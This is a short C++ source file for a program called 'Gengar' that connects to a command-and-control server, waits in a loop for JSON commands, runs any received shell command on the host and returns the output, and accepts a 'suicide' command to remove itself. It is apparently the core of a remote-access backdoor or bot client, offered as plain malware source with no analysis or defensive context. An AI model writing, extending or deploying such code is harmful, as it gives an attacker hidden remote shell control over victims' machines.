#include "gengar.h"

void Gengar::ConnectToCnc() { m_client.Connect(); }

void Gengar::ListenForCommand()
{
	while (true)
	{
		try
		{
			RouteCommand(m_client.Receive());
		}
		catch (boost::system::system_error&)
		{
			ConnectToCnc();
			ListenForCommand();
		}
	}
}

void Gengar::RouteCommand(json cmd)
{
	if (cmd["cmd"] == "shell")
		m_client.Send(m_machine.RunShellCommand(cmd["content"]));
	else if (cmd["cmd"] == "suicide")
		m_machine.Suicide();
	else
		m_client.Send("Unknown command.");
}
